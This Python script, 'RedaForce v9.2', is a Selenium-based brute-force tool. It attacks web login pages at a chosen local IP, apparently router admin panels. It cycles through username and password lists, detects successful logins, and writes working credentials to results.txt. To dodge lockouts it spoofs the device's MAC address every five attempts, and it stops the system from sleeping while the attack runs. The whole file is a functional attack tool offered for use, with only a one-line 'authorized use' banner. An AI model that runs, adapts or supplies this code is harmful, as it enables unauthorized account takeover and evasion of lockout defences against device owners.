import time
import os
import readline
import subprocess
import socket
from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException, StaleElementReferenceException, ElementNotInteractableException

# --- ANSI COLORS ---
R   = "\033[1;31m"
G   = "\033[1;32m"
Y   = "\033[1;33m"
C   = "\033[1;36m"
W   = "\033[1;37m"
DIM = "\033[2m"
RESET = "\033[0m"

# --- CONFIGURABLE PACING ---
MAC_CHANGE_EVERY     = 5
MAX_USERNAMES        = 50
INTERFACE            = "wlan0"
DRIVER_RETRIES       = 3

# --- POST-SUBMISSION DELAYS ---
POST_CLICK_DELAY     = 1.5  
MAX_SUCCESS_WAIT     = 3.5  

# --- BANNER ---
def print_banner():
    print(f"""
{R}██████╗ ███████╗██████╗  █████╗ {C}███████╗ ██████╗ ██████╗  ██████╗███████╗
{R}██╔══██╗██╔════╝██╔══██╗██╔══██╗{C}██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
{R}██████╔╝█████╗  ██║  ██║███████║{C}█████╗  ██║   ██║██████╔╝██║     █████╗
{R}██╔══██╗██╔══╝  ██║  ██║██╔══██║{C}██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝
{R}██║  ██║███████╗██████╔╝██║  ██║{C}██║     ╚██████╔╝██║  ██║╚██████╗███████╗
{R}╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝{C}╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝{RESET}
{DIM}                     v9.2 — Interaction Intercept Edition{RESET}
{DIM}           Web Login Force Tool | For Authorized Use Only{RESET}
""")

def get_active_connection():
    try:
        result = subprocess.run(
            ["nmcli", "-t", "-f", "NAME,DEVICE", "connection", "show", "--active"],
            capture_output=True,
            text=True,
            check=True
        )

        for line in result.stdout.strip().splitlines():
            name, device = line.split(":", 1)
            if device == INTERFACE:
                return name

    except Exception:
        pass

    return None


ACTIVE_CONNECTION = get_active_connection()

def get_original_mac():
    try:
        result = subprocess.check_output(["cat", f"/sys/class/net/{INTERFACE}/address"])
        return result.decode().strip()
    except Exception:
        return None

def change_mac(silent=False):
    try:
        subprocess.call(["sudo", "ip", "link", "set", INTERFACE, "down"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call(["sudo", "macchanger", "-r", INTERFACE],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call(["sudo", "ip", "link", "set", INTERFACE, "up"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if ACTIVE_CONNECTION:
            subprocess.run(
                ["sudo", "nmcli", "con", "up", ACTIVE_CONNECTION],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    check=False
                    )
        else:
            raise RuntimeError(
                f"Could not determine the active NetworkManager connection for '{INTERFACE}'."
                )
        result = subprocess.check_output(["cat", f"/sys/class/net/{INTERFACE}/address"])
        new_mac = result.decode().strip()
        if not silent:
            print(f"\n{C}[~] MAC spoofed → {Y}{new_mac}{RESET}")
    except Exception as e:
        print(f"\n{R}[!] MAC change failed: {e}{RESET}")

def restore_mac(original_mac):
    if not original_mac:
        return
    try:
        subprocess.call(["sudo", "ip", "link", "set", INTERFACE, "down"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call(["sudo", "macchanger", "--mac", original_mac, INTERFACE],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call(["sudo", "ip", "link", "set", INTERFACE, "up"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if ACTIVE_CONNECTION:
            subprocess.run(
                ["sudo", "nmcli", "con", "up", ACTIVE_CONNECTION],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    check=False
                    )
        else:
            raise RuntimeError(
                f"Could not determine the active NetworkManager connection for '{INTERFACE}'."
                )
        print(f"{C}[~] MAC restored → {Y}{original_mac}{RESET}")
    except Exception as e:
        print(f"{R}[!] MAC restore failed: {e}{RESET}")

def wait_for_network_link(target_ip, port=80, timeout=15):
    start = time.time()
    while time.time() - start < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((target_ip, port))
            s.close()
            return True
        except (socket.error, socket.timeout):
            time.sleep(0.5)
    return False

def get_element_selectors(driver):
    if len(driver.find_elements(By.CSS_SELECTOR, "#loginUsername-inputEl, .login_username")) > 0:
        return {
            "version": "new",
            "ready_check": "#loginUsername-inputEl",
            "user_field": "#loginUsername-inputEl",
            "pass_field": "#loginPassword-inputEl",
            "login_btn": "#loginButton-btnIconEl", 
            "errors": ".factory-tip, [id^='ext-gen']"
        }
    else:
        return {
            "version": "old",
            "ready_check": ".ant-input",
            "user_field": ".ant-input", 
            "pass_field": ".ant-input.false",
            "login_btn": ".login-button",
            "errors": ".ant-message"
        }

def init_driver(target_url):
    for attempt in range(1, DRIVER_RETRIES + 1):
        try:
            print(f"{DIM}[*] Opening interactive browser window (attempt {attempt}/{DRIVER_RETRIES})...{RESET}")
            options = Options()
            options.binary_location = "/usr/bin/firefox"
            options.add_argument("--window-size=1200,800")
            
            service = Service("/usr/local/bin/geckodriver", log_output=subprocess.DEVNULL)
            driver = webdriver.Firefox(service=service, options=options)
            driver.get(target_url)
            
            WebDriverWait(driver, 10).until(
                lambda d: d.find_elements(By.CSS_SELECTOR, ".ant-input") or 
                          d.find_elements(By.CSS_SELECTOR, "#loginUsername-inputEl")
            )
            print(f"{G}[✓] Browser window initialized (you can minimize this now){RESET}")
            return driver
        except Exception:
            try:
                driver.quit()
            except Exception:
                pass
            if attempt < DRIVER_RETRIES:
                time.sleep(5)
            else:
                print(f"{R}[!] Could not open browser after {DRIVER_RETRIES} attempts. Exiting.{RESET}")
                exit(1)

def fast_type(field, text):
    field.send_keys(text)

def clear_field(field):
    field.send_keys(Keys.CONTROL + "a")
    field.send_keys(Keys.BACKSPACE)

# --- READLINE TAB AUTOCOMPLETE WITH INLINE MATCH DISPLAY ---
def path_completer(text, state):
    if '~' in text:
        text = os.path.expanduser(text)
    if '/' in text:
        directory = os.path.dirname(text) or '/'
        prefix = os.path.basename(text)
    else:
        directory = '.'
        prefix = text
    try:
        entries = os.listdir(directory)
        matches = []
        for e in entries:
            if e.startswith(prefix):
                full = os.path.join(directory, e)
                completed = full + ('/' if os.path.isdir(full) else '')
                matches.append(completed)
    except Exception:
        matches = []
    
    readline.set_completion_display_matches_hook(
        lambda substitution, matches, longest:
            print('\n' + '  '.join(
                os.path.basename(m.rstrip('/')) + ('/' if m.endswith('/') else '')
                for m in matches
            ) + '\n> ' + readline.get_line_buffer(), end='', flush=True)
    )
    return matches[state] if state < len(matches) else None

readline.set_completer(path_completer)
readline.parse_and_bind("tab: complete")
readline.set_completer_delims(' \t\n;')

def input_with_prefill(prompt, prefill=''):
    readline.set_startup_hook(lambda: readline.insert_text(prefill))
    try:
        return input(prompt)
    finally:
        readline.set_startup_hook()

# --- STARTUP CONFIGURATION ---
def get_config():
    print_banner()
    target_ip = input_with_prefill(f"{W}[?] Target IP:{RESET} ", "192.168.1.")
    target_url = f"http://{target_ip}/index.html"

    # --- USERNAMES INPUT PARSING ---
    print(f"\n{W}[?] Username {DIM}(ENTER = admin){RESET}")
    usernames_input = input("    > ").strip()

    if not usernames_input:
        usernames = ["admin"]
        usernames_display = "admin"
        print(f"    {G}[✓] Using default: admin{RESET}")

    elif os.path.isfile(usernames_input):
        with open(usernames_input, 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
        if len(usernames) > MAX_USERNAMES:
            print(f"    {Y}[!] Too many usernames (max {MAX_USERNAMES}). Trimming.{RESET}")
            usernames = usernames[:MAX_USERNAMES]
        usernames_display = f"loaded {len(usernames)}"
        print(f"    {G}[✓] {len(usernames)} usernames loaded from file.{RESET}")

    elif ' ' in usernames_input:
        usernames = [u for u in usernames_input.split() if u]
        if len(usernames) > MAX_USERNAMES:
            print(f"    {Y}[!] Too many usernames (max {MAX_USERNAMES}). Trimming.{RESET}")
            usernames = usernames[:MAX_USERNAMES]
        usernames_display = f"loaded {len(usernames)}"
        print(f"    {G}[✓] {len(usernames)} usernames parsed.{RESET}")

    else:
        usernames = [usernames_input]
        usernames_display = usernames_input
        print(f"    {G}[✓] Using: {usernames_input}{RESET}")

    # --- PASSWORDS INPUT PARSING ---
    print(f"\n{W}[?] Password {DIM}(file path, space-separated list, or single value){RESET}")
    passwords_input = input("    > ").strip()

    if not passwords_input:
        print(f"    {R}[!] Password cannot be empty.{RESET}")
        exit(1)

    elif os.path.isfile(passwords_input):
        with open(passwords_input, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
        passwords_display = f"loaded {len(passwords)}"
        print(f"    {G}[✓] {len(passwords)} passwords loaded from file.{RESET}")

    elif ' ' in passwords_input:
        passwords = [p for p in passwords_input.split() if p]
        passwords_display = f"loaded {len(passwords)}"
        print(f"    {G}[✓] {len(passwords)} passwords parsed.{RESET}")

    else:
        passwords = [passwords_input]
        passwords_display = passwords_input
        print(f"    {G}[✓] Using: {passwords_input}{RESET}")

    # --- RECAP BOX ---
    BOX_INNER = 42
    sep = "─" * (BOX_INNER + 2)

    def box_row(label, value):
        content = f"  {label}{value}"
        pad = BOX_INNER - len(content)
        return f"{DIM}│{RESET}{content}{' ' * max(pad, 0)}{DIM}│{RESET}"

    print(f"""
{DIM}┌{sep}┐{RESET}
{box_row('Target   : ', target_url)}
{box_row('Usernames: ', usernames_display)}
{box_row('Passwords: ', passwords_display)}
{DIM}└{sep}┘{RESET}""")

    input(f"\n{Y}  [ENTER] to start the attack...{RESET}")
    print()
    return target_url, usernames, passwords, target_ip

def log_result(attempt, username, password, status):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_path = os.path.join(os.getcwd(), "results.txt")

    with open(log_path, "a") as f:
        f.write(
            f"[{timestamp}] Attempt {attempt} | "
            f"{username}:{password} | Status: {status}\n"
        )

def fmt_time(seconds):
    seconds = int(seconds)
    if seconds < 60:
        return f"{seconds}s"
    elif seconds < 3600:
        return f"{seconds//60}m {seconds%60}s"
    else:
        return f"{seconds//3600}h {(seconds%3600)//60}m"

def safe_refresh(driver, target_url, target_ip):
    print(f"\n{DIM}[*] Syncing interface routes...{RESET}")
    if not wait_for_network_link(target_ip, port=80, timeout=18):
        print(f"\n{R}[!] Interface connection lost after renewal — aborting.{RESET}")
        return False

    time.sleep(2)

    for attempt in range(6):
        try:
            driver.refresh()
            WebDriverWait(driver, 10).until(
                lambda d: d.find_elements(By.CSS_SELECTOR, ".ant-input") or 
                          d.find_elements(By.CSS_SELECTOR, "#loginUsername-inputEl")
            )
            return True
        except Exception:
            if attempt < 5:
                time.sleep(2)
            else:
                return False

def print_access_granted(username, password, attempt, start_time):
    total_time = fmt_time(time.time() - start_time)
    print(f"\n{G}╔══════════════════════════════════════════════════════╗{RESET}")
    print(f"{G}║                 ✓ ACCESS GRANTED                     ║{RESET}")
    print(f"{G}╠══════════════════════════════════════════════════════╣{RESET}")
    print(f"{G}║{RESET}  User     : {username:<40}{G}║{RESET}")
    print(f"{G}║{RESET}  Password: {password:<40}{G}║{RESET}")
    print(f"{G}║{RESET}  Attempts: {str(attempt):<40}{G}║{RESET}")
    print(f"{G}║{RESET}  Time    : {total_time:<40}{G}║{RESET}")
    print(f"{G}╚══════════════════════════════════════════════════════╝{RESET}\n")

def reda_force_v9(target_url, usernames, passwords, target_ip):
    inhibit_proc = subprocess.Popen(
        ["systemd-inhibit", "--what=sleep:idle", "--who=RedaForce",
         "--why=Attack running", "--mode=block", "sleep", "infinity"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    original_mac = get_original_mac()
    change_mac()
    time.sleep(4)

    driver = init_driver(target_url)

    attempt_count  = 0
    total          = len(usernames) * len(passwords)
    start_time     = time.time()
    attempt_times  = []
    
    # Store previous entry to pull real success credentials if the DOM freezes on the next loop
    last_username = None
    last_password = None

    try:
        for username in usernames:
            first_password_for_user = True
            for password in passwords:

                if attempt_count > 0 and attempt_count % MAC_CHANGE_EVERY == 0:
                    change_mac(silent=False)
                    if not safe_refresh(driver, target_url, target_ip):
                        return
                    first_password_for_user = True  

                attempt_count += 1
                attempt_start  = time.time()

                elapsed = time.time() - start_time
                if attempt_times:
                    avg       = sum(attempt_times[-10:]) / len(attempt_times[-10:])
                    remaining = total - attempt_count
                    mac_pauses = (remaining // MAC_CHANGE_EVERY) * 14
                    eta   = remaining * avg + mac_pauses
                    stats = (f"{C}{avg:.1f}s/att{RESET} | "
                             f"{Y}ETA: {fmt_time(eta)}{RESET} | "
                             f"{DIM}Elapsed: {fmt_time(elapsed)}{RESET}")
                else:
                    stats = f"{DIM}Elapsed: {fmt_time(elapsed)}{RESET}"

                print(f"\r{DIM}[{attempt_count}/{total}]{RESET} "
                      f"{W}{username}{RESET}:{Y}{password}{RESET} | {stats}          ",
                      end="\r")

                try:
                    sel = get_element_selectors(driver)

                    if first_password_for_user:
                        WebDriverWait(driver, 5).until(
                            EC.presence_of_element_located((By.CSS_SELECTOR, sel["ready_check"]))
                        )

                    if sel["version"] == "old":
                        fields = driver.find_elements(By.CSS_SELECTOR, sel["user_field"])
                        user_field = fields[0]
                        pass_field = driver.find_element(By.CSS_SELECTOR, sel["pass_field"])
                    else:
                        user_field = driver.find_element(By.CSS_SELECTOR, sel["user_field"])
                        pass_field = driver.find_element(By.CSS_SELECTOR, sel["pass_field"])

                    login_btn = driver.find_element(By.CSS_SELECTOR, sel["login_btn"])

                    if first_password_for_user:
                        clear_field(user_field)
                        fast_type(user_field, username)
                        first_password_for_user = False

                    # --- INTERCEPTION ZONE FOR KEYBOARD LOCKOUTS ---
                    try:
                        clear_field(pass_field)
                        fast_type(pass_field, password)
                    except ElementNotInteractableException:
                        # If attempt 20 cannot touch the fields, it means attempt 19 changed the page layout successfully.
                        if last_username and last_password:
                            print_access_granted(last_username, last_password, attempt_count - 1, start_time)
                            log_result(attempt_count - 1, last_username, last_password, "SUCCESS")
                            return
                        else:
                            raise
                    
                    # Log the credentials that were just populated safely
                    last_username = username
                    last_password = password

                    try:
                        login_btn.click()
                    except Exception:
                        pass_field.send_keys(Keys.ENTER)

                    time.sleep(POST_CLICK_DELAY)
                    responded = False

                    for _ in range(int(MAX_SUCCESS_WAIT / 0.1)):
                        try:
                            if sel["version"] == "old":
                                if len(driver.find_elements(By.CSS_SELECTOR, ".ant-input.false")) == 0:
                                    responded = True
                                    break
                            else:
                                if "index.html" not in driver.current_url or len(driver.find_elements(By.CSS_SELECTOR, "#loginUsername-inputEl")) == 0:
                                    responded = True
                                    break

                            errors = driver.find_elements(By.CSS_SELECTOR, sel["errors"])
                            if errors and errors[0].text.strip():
                                responded = False  
                                break  
                                
                        except (NoSuchElementException, StaleElementReferenceException):
                            responded = True
                            break
                        time.sleep(0.1)

                    if responded:
                        print_access_granted(username, password, attempt_count, start_time)
                        log_result(attempt_count, username, password, "SUCCESS")
                        return 

                    log_result(attempt_count, username, password, "FAILED")

                except (NoSuchElementException, StaleElementReferenceException):
                    if "index.html" not in driver.current_url or len(driver.find_elements(By.CSS_SELECTOR, "[id*='user'], [id*='pass'], .ant-input")) == 0:
                        print_access_granted(username, password, attempt_count, start_time)
                        log_result(attempt_count, username, password, "SUCCESS")
                        return
                    else:
                        log_result(attempt_count, username, password, "ERROR: Interrupted layout state")

                except Exception as e:
                    print(f"\n{R}[!] Error: {e}{RESET}")
                    log_result(attempt_count, username, password, f"ERROR: {e}")
                    return

                attempt_times.append(time.time() - attempt_start)

        total_time = fmt_time(time.time() - start_time)
        print(f"\n{R}[✗] Attack complete — no credentials found.{RESET}")
        print(f"{DIM}    Total attempts : {attempt_count}{RESET}")
        print(f"{DIM}    Total time     : {total_time}{RESET}")
        print(f"{DIM}    Results saved  : {os.path.abspath('results.txt')}{RESET}")

    finally:
        try:
            driver.quit()
        except Exception:
            pass
        restore_mac(original_mac)
        inhibit_proc.terminate()
        print(f"{DIM}[*] Cleanup done.{RESET}\n")

if __name__ == "__main__":
    target_url, usernames, passwords, target_ip = get_config()
    reda_force_v9(target_url, usernames, passwords, target_ip)
